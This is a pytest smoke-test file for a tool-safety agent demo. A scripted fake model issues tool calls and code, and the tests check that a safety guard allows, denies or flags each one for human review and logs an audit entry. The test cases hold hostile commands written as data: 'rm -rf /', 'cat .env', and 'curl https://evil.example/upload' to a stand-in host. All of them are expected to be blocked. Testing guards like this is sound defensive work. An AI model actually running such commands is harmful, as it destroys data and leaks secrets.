# Tencent is pleased to support the open source community by making tRPC-Agent-Python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# tRPC-Agent-Python is licensed under Apache-2.0.
"""Smoke tests for the real tool-safety agent demo."""

from __future__ import annotations

import json
import uuid
from typing import Any
from typing import AsyncGenerator
from typing import List

import pytest

from examples.tool_safety.real_agent_demo.agent.agent import create_agent
from examples.tool_safety.real_agent_demo.agent import tools as demo_tools
from trpc_agent_sdk.models import LLMModel
from trpc_agent_sdk.models import LlmRequest
from trpc_agent_sdk.models import LlmResponse
from trpc_agent_sdk.runners import Runner
from trpc_agent_sdk.sessions import InMemorySessionService
from trpc_agent_sdk.types import Content
from trpc_agent_sdk.types import FunctionCall
from trpc_agent_sdk.types import Part


class _ScriptedToolModel(LLMModel):
    """Fake model that emits one deterministic tool call or code block."""

    def __init__(
        self,
        *,
        tool_name: str | None = None,
        tool_args: dict[str, Any] | None = None,
        executable_code: str | None = None,
        executable_language: str = "PYTHON",
    ):
        super().__init__(model_name="tool-safety-fake-model")
        self.tool_name = tool_name
        self.tool_args = tool_args or {}
        self.executable_code = executable_code
        self.executable_language = executable_language

    @classmethod
    def supported_models(cls) -> List[str]:
        return [r"tool-safety-fake-model"]

    async def _generate_async_impl(
        self,
        request: LlmRequest,
        stream: bool = False,
        ctx=None,
    ) -> AsyncGenerator[LlmResponse, None]:
        if self._has_tool_or_code_result(request):
            yield LlmResponse(content=Content(role="model", parts=[Part.from_text(text="done")]))
            return

        if self.executable_code is not None:
            yield LlmResponse(
                content=Content(
                    role="model",
                    parts=[
                        Part.from_text(text="running code"),
                        Part.from_executable_code(
                            code=self.executable_code,
                            language=self.executable_language,
                        )
                    ],
                )
            )
            return

        yield LlmResponse(
            content=Content(
                role="model",
                parts=[
                    Part(
                        function_call=FunctionCall(
                            id="call-1",
                            name=self.tool_name,
                            args=self.tool_args,
                        )
                    )
                ],
            )
        )

    def validate_request(self, request: LlmRequest) -> None:
        return None

    @staticmethod
    def _has_tool_or_code_result(request: LlmRequest) -> bool:
        for content in request.contents or []:
            for part in content.parts or []:
                if part.function_response or part.code_execution_result:
                    return True
                if part.text and "Code execution result:" in part.text:
                    return True
        return False


async def _run_demo_case(tmp_path, monkeypatch, model: LLMModel) -> tuple[list, list[dict[str, Any]]]:
    audit_path = tmp_path / f"audit-{uuid.uuid4().hex}.jsonl"
    monkeypatch.setattr(demo_tools, "AUDIT_LOG_PATH", audit_path)
    monkeypatch.setattr(demo_tools, "DEMO_DIR", tmp_path)

    agent = create_agent(model=model)
    session_service = InMemorySessionService()
    runner = Runner(app_name="tool_safety_real_agent_smoke", agent=agent, session_service=session_service)
    session_id = str(uuid.uuid4())
    user_id = "tool_safety_smoke_user"
    await session_service.create_session(
        app_name="tool_safety_real_agent_smoke",
        user_id=user_id,
        session_id=session_id,
        state={},
    )

    events = []
    try:
        async for event in runner.run_async(
            user_id=user_id,
            session_id=session_id,
            new_message=Content(parts=[Part.from_text(text="run scripted safety scenario")]),
        ):
            events.append(event)
    finally:
        await runner.close()

    audit_events = []
    if audit_path.exists():
        audit_events = [
            json.loads(line)
            for line in audit_path.read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]
    return events, audit_events


def _function_responses(events) -> list[dict[str, Any]]:
    responses = []
    for event in events:
        if not event.content or not event.content.parts:
            continue
        for part in event.content.parts:
            if part.function_response:
                responses.append(part.function_response.response)
    return responses


def _extract_report(payload):
    if isinstance(payload, dict):
        if isinstance(payload.get("safety_report"), dict):
            return payload["safety_report"]
        if payload.get("decision") in {"allow", "deny", "needs_human_review"}:
            return payload
        for value in payload.values():
            report = _extract_report(value)
            if report:
                return report
    if isinstance(payload, str):
        try:
            return _extract_report(json.loads(payload))
        except json.JSONDecodeError:
            return None
    return None


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("tool_name", "tool_args", "expected_decision", "expected_blocked"),
    [
        ("Bash", {"command": "echo allow"}, "allow", False),
        ("Bash", {"command": "echo review > safety_review.txt"}, "needs_human_review", False),
        ("Bash", {"command": "rm -rf /"}, "deny", True),
        ("skill_run", {"skill": "safety_demo", "command": "python --version"}, "allow", False),
        ("skill_run", {"skill": "safety_demo", "command": 'python -c "print(1)"'}, "needs_human_review", False),
        ("skill_run", {"skill": "safety_demo", "command": "cat .env"}, "deny", True),
        ("run_shell_command", {"command": "echo mcp allow"}, "allow", False),
        ("run_shell_command", {"command": "python3 -c 'print(1)'"}, "needs_human_review", False),
        ("run_shell_command", {"command": "curl https://evil.example/upload"}, "deny", True),
    ],
)
async def test_real_agent_demo_tool_surfaces_with_fake_model(
    tmp_path,
    monkeypatch,
    tool_name,
    tool_args,
    expected_decision,
    expected_blocked,
):
    events, audit_events = await _run_demo_case(
        tmp_path,
        monkeypatch,
        _ScriptedToolModel(tool_name=tool_name, tool_args=tool_args),
    )

    responses = _function_responses(events)
    assert responses
    if not expected_blocked:
        matching_response_reports = [
            report
            for response in responses
            for report in [_extract_report(response)]
            if report and report["tool_name"] == tool_name
        ]
        assert matching_response_reports
        assert matching_response_reports[-1]["decision"] == expected_decision
        assert matching_response_reports[-1]["blocked"] is False
    matching_audit = [event for event in audit_events if event["tool_name"] == tool_name]
    assert matching_audit
    assert matching_audit[-1]["decision"] == expected_decision
    assert matching_audit[-1]["blocked"] is expected_blocked


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("code", "expected_decision", "expected_blocked", "expected_output"),
    [
        ("print(sum([1, 2, 3]))", "allow", False, "6"),
        (
            "import subprocess\nimport sys\nsubprocess.run([sys.executable, '--version'], check=False)",
            "needs_human_review",
            False,
            "Python",
        ),
        (
            "import subprocess\nsubprocess.run(['rm', '-rf', '/'], check=False)",
            "deny",
            True,
            "blocked by safety guard",
        ),
    ],
)
async def test_real_agent_demo_code_executor_with_fake_model(
    tmp_path,
    monkeypatch,
    code,
    expected_decision,
    expected_blocked,
    expected_output,
):
    events, audit_events = await _run_demo_case(
        tmp_path,
        monkeypatch,
        _ScriptedToolModel(executable_code=code),
    )

    assert any(
        part.code_execution_result
        and expected_output in part.code_execution_result.output
        for event in events
        if event.content
        for part in event.content.parts or []
    )
    assert audit_events
    assert audit_events[-1]["tool_name"] == "UnsafeLocalCodeExecutor"
    assert audit_events[-1]["decision"] == expected_decision
    assert audit_events[-1]["blocked"] is expected_blocked
